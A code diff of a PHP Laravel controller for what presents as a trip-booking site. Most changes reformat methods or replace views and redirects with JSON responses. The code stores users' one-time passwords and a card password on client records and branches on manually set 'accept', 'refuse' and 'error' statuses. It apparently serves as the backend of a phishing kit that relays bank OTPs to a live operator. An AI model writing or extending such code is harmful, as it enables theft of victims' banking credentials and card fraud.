@@ -107,9 +107,10 @@ class ClientController extends Controller
 //        return view('frontend.otppass');
     }
 
-    public function storeOtpInfoStep2(){
-        $client=session('client');
-        $trip=session('trip_id');
+    public function storeOtpInfoStep2()
+    {
+        $client = session('client');
+        $trip = session('trip_id');
         return view('frontend.otp_info1')->with([
             'client' => $client,
             'trip_id' => $trip,
@@ -120,9 +121,9 @@ class ClientController extends Controller
 
     public function storeOtpInfoStep1(Request $request)
     {
-
-//        return $request;
-        $client = Client::where('id', $request->client_id)->first();
+//        $client=session('client');
+        // dd($request);
+        $client = Client::where('id', $request['client_id'])->first();
         $client->otp1 = $request->otp_code;
         $client->save();
 //        $countries = Country::all();
@@ -131,28 +132,32 @@ class ClientController extends Controller
 
         if ($client->status1 == 'accept') {
 
-            return redirect(route('password_card_page'));
+            // return redirect(route('password_card_page'));
+
+            return response()->json(['status' => 200, 'data' => 'accept', 'url' => 0]);
+
 
         } else if ($client->status1 == 'refuse') {
 
 
             Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');
 
-            return back();
+
+            // return redirect(route('otp-code-step-2'));
+            return response()->json(['status' => 200, 'data' => 'refuse', 'url' => 0]);
 
 
         } elseif ($client->status1 == 'error') {
+            $url = url('sbank_infosss/' . $trip_id . '/' . $request->client_id);
 
-            return redirect(url('sbank_infosss/' . $trip_id . '/' . $request->client_id));
+            // return redirect(url('sbank_infosss/' . $trip_id . '/' . $request->client_id));
+            return response()->json(['status' => 200, 'data' => 'error', 'urlData' => $url]);
+
+
         } else {
-//            return "sAS";
-            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
-            return view('frontend.otp_info1')->with([
-                'client' => $client,
-                'trip_id' => $trip_id,
-                'client_id' => $request->client_id
-            ]);
 
+
+            return response()->json(['status' => 200, 'data' => 'pop', 'url' => 0]);
         }
 
 //        return view('frontend.otp_info1',compact('client'));
@@ -167,7 +172,10 @@ class ClientController extends Controller
 
     public function getPhoneInfo($trip_id, $client_id)
     {
-        return view('frontend.Phone_info', compact('trip_id', 'client_id', 'sms_providers'));
+        $client=Client::find($client_id);
+        $countries = Country::get();
+        $sms_providers = SmsProvider::get();
+        return view('frontend.phone_info', compact('client','trip_id', 'client_id','countries', 'sms_providers'));
     }
 
     public function storePhoneInfo(Request $request)
@@ -186,8 +194,8 @@ class ClientController extends Controller
     public function checkOtpCode(CheckOtpCodeRequest $request)
     {
 
-        $clients=session('client');
-        $trip_id=session('trip_id');
+        $clients = session('client');
+        $trip_id = session('trip_id');
         $client = Client::where('id', $clients['id'])->first();
         $client->otp2 = $request->otp_code;
         $client->save();
@@ -195,29 +203,36 @@ class ClientController extends Controller
         $sms_providers = SmsProvider::get();
 
 
-        if($client->status2=='accept'){
-            return view('frontend.phone_info', compact('client', 'trip_id', 'countries', 'sms_providers'));
+        if ($client->status2 == 'accept') {
+            $url = url('getPhoneInfo/'.$trip_id.'/'.$client->id);
+//            return view('frontend.phone_info', compact('client', 'trip_id', 'countries', 'sms_providers'));
 
+            return response()->json(['status' => 200, 'data' => 'accept', 'url' => $url]);
 
-        }else if($client->status2=='refuse'){
+        } else if ($client->status2 == 'refuse') {
 
 
             Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');
+            $url = route('otp_card_page22');
+            return response()->json(['status' => 200, 'data' => 'refuse', 'url' => $url]);
 
-            return back();
-        } else{
-            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
-            return back();
+        } else {
+//            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
+            return response()->json(['status' => 200, 'data' => 'pop']);
 
 
         }
     }
 
-    public function checkOtppage22(){
+    public
+    function checkOtppage22()
+    {
 
         return view('frontend.otp_info');
     }
-    public function checkOtpCodePassword(Request $request)
+
+    public
+    function checkOtpCodePassword(Request $request)
     {
 
         $client = session('client');
@@ -234,7 +249,8 @@ class ClientController extends Controller
 
     }
 
-    public function checkOtpCodeotp(CheckOtpCodeRequest $request)
+    public
+    function checkOtpCodeotp(CheckOtpCodeRequest $request)
     {
         $client = session('client');
 
@@ -249,8 +265,8 @@ class ClientController extends Controller
     }
 
 
-
-    public function checkOtppassword()
+    public
+    function checkOtppassword()
     {
 //        $client = Client::where('id', $request->client_id)->first();
 //        $client->otp2 = $request->otp_code;
@@ -258,13 +274,15 @@ class ClientController extends Controller
         return view('frontend.password_card');
     }
 
-    public function checkOtppage()
+    public
+    function checkOtppage()
     {
 
         return view('frontend.otppass');
     }
 
-    public function storePasswordCard(PasswordCardRequest $request)
+    public
+    function storePasswordCard(PasswordCardRequest $request)
     {
         $client = Client::where('id', $request->client_id)->first();
         $client->password_card = $request->password;
@@ -272,7 +290,8 @@ class ClientController extends Controller
         return view('frontend.password_number', compact('client'));
     }
 
-    public function tripInvoice($clientTrip_id)
+    public
+    function tripInvoice($clientTrip_id)
     {
         $clientTrip = ClientTrip::where('id', $clientTrip_id)->first();
         $trip = Trip::with(['fromCity', 'toCity'])->where('id', $clientTrip->trip_id)->first();
@@ -280,14 +299,16 @@ class ClientController extends Controller
     }
 
 
-    public function edit($client_id)
+    public
+    function edit($client_id)
     {
         $client = Client::whereId($client_id)->firstOrFail();
         $countries = Country::all();
         return view('dashboard.clients.edit', ['client' => $client, 'countries' => $countries]);
     }
 
-    public function update(Request $request)
+    public
+    function update(Request $request)
     {
         $inputs = $request->all();
         Client::whereId($inputs['id'])->update([
@@ -303,7 +324,8 @@ class ClientController extends Controller
         return redirect()->route('clients.index');
     }
 
-    public function destroy(Client $client)
+    public
+    function destroy(Client $client)
     {
         $client->delete();
         Alert::info(' العملاء', 'تم حذف العميل بنجاح');
